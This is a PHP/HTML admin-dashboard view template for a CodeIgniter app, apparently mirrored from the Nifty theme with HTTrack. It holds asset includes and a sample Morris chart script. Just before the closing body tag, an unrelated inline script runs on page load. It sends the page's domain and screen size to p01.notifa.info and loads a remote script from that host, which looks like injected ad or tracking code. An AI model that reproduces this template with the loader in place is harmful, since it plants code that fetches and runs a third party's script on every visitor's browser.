<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/dashboard-3.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:05:06 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Dashboard | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->
    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <!-- <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo-icons.min.css" rel="stylesheet"> -->


    <!--=================================================-->



    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo.min.css" rel="stylesheet">

    <!--Font Awesome [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">

    <!--Ion Icons [ OPTIONAL ]-->
       <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">

    <!--Unite Gallery [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/unitegallery/css/unitegallery.min.css" rel="stylesheet">

    <!--Bootstrap Select [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.css" rel="stylesheet">

    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet">

    <!--Animate.css [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/animate-css/animate.min.css" rel="stylesheet">

    <!--Chosen [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/chosen/chosen.min.css" rel="stylesheet">

    <!--FooTable [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/fooTable/css/footable.core.css" rel="stylesheet">

    <!--X-editable [ OPTIONAL ]-->
    <link href="plugins/x-editable/css/bootstrap-editable.css" rel="stylesheet">

    <!--Dropzone [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-out slide">

        <!--NAVBAR-->
        <!--===================================================-->

        <!--===================================================-->
        <!--END NAVBAR-->

                <div id="head-content">
    <hr class="new-section-sm bord-no">
    <div class="text-center">
        <h3>Welcome back to the Dashboar.</h3>
    </div>
    <hr class="new-section-md bord-no">
                    </div>


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">

                        <?php
                                  $this->load->view($namamodule .'/'.$namafileview);
                                ?>





    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>




    <!--=================================================-->

    <!--Demo script [ DEMONSTRATION ]-->
    <!-- <script src="<?php echo base_url(); ?>assets/js/demo/nifty-demo.min.js"></script> -->


    <!--Unite Gallery [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/unitegallery/js/unitegallery.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/plugins/unitegallery/themes/tilesgrid/ug-theme-tilesgrid.js"></script>

    <!--Bootstrap Select [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.js"></script>

    <!--Chosen [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/chosen/chosen.jquery.min.js"></script>

    <!--FooTable [ OPTIONAL ]-->
  <script src="<?php echo base_url(); ?>assets/plugins/fooTable/dist/footable.all.min.js"></script>

    <!--FooTable Example [ SAMPLE ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/tables-footable.js"></script>

    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>

    <!--DataTables [ OPTIONAL ]-->
    <!-- <script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/jquery.dataTables.js"></script>
  <script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
  <script src="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script> -->


    <!--DataTables Sample [ SAMPLE ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/tables-datatables.js"></script>

    <!--Dropzone [ OPTIONAL ]-->
    <script src="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.js"></script>


    <!--Form File Upload [ SAMPLE ]-->
    <script src="<?php echo base_url(); ?>assets/js/demo/form-file-upload.js"></script>


    <!--Custom script [ DEMONSTRATION ]-->
    <!--===================================================-->
    <script>
        $(document).on('nifty.ready', function () {

			    // MORRIS LINE CHART
			    // =================================================================
			    // Require MorrisJS Chart
			    // -----------------------------------------------------------------
			    // http://morrisjs.github.io/morris.js/
			    // =================================================================
			    var day_data = [
			        {'elapsed': '2000', 'value': 18},
			        {'elapsed': '2001', 'value': 24},
			        {'elapsed': '2002', 'value': 9},
			        {'elapsed': '2003', 'value': 12},
			        {'elapsed': '2004', 'value': 13},
			        {'elapsed': '2005', 'value': 22},
			        {'elapsed': '2006', 'value': 11},
			        {'elapsed': '2007', 'value': 26},
			        {'elapsed': '2008', 'value': 12},
			        {'elapsed': '2009', 'value': 19},
			        {'elapsed': '2000', 'value': 15},
			        {'elapsed': '2001', 'value': 24},
			        {'elapsed': '2002', 'value': 9},
			        {'elapsed': '2003', 'value': 12},
			        {'elapsed': '2004', 'value': 13},
			        {'elapsed': '2005', 'value': 22},
			        {'elapsed': '2006', 'value': 15},
			        {'elapsed': '2007', 'value': 26},
			        {'elapsed': '2008', 'value': 12},
			        {'elapsed': '2009', 'value': 19}
			    ];
			    Morris.Line({
			        element: 'demo-morris-line',
			        data: day_data,
			        xkey: 'elapsed',
			        ykeys: ['value'],
			        labels: ['value'],
			        gridEnabled: true,
			        gridLineColor: 'rgba(0,0,0,.1)',
			        gridTextColor: '#8f9ea6',
			        gridTextSize: '11px',
			        lineColors: ['#177bbb'],
			        lineWidth: 2,
			        parseTime: false,
			        resize:true,
			        hideHover: 'auto'
			    });

        });
    </script>



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUkQD%2b024%2fArzaqCQhexAt3p9BwcsRP5IwkoSs8WrVS4Qh%2bsLnuRiAJGIQExuaX8KWIW8hEs%2bz4xe1UFX8bz44cBRK%2fAqjwDDj%2b8wv496uZ2VyJ%2fwJPKvmb%2bC0JuRHy1Sc%2bciCGMHQhahimsflgYff8NpqolTRWF7WZVUbMSbde%2fWKsfEo04Ks2q3KdlhkGXJo90si%2boIqX3nubX7PwODimWfm1iERKv6bRhM0X3smWPzZccF6nolUR82dwoWAtCaNiI%2fTqNwFDUVGo5l0OxebqxUT285yNV%2bn1SYI3ZOyIFsi70zaEl%2f0nGS0w8OLGH53aSWmg%2bCoCQHsjawCwo%2fkAh1Sh97uGGKjmGSpwrEt0KNA%2blq0P5TOhP31ojzHZELkK8DmBA0KRFQ1ztl0FQ8PT0nNEVAqKE9Obwd%2fx712Du2SM7s33NQ37iuAd9OXXtgBC8qwsUHXvFHFFZ7283IYu07%2f59e7tRZcxvFSVdyMpag%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/dashboard-3.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:05:11 GMT -->
</html>
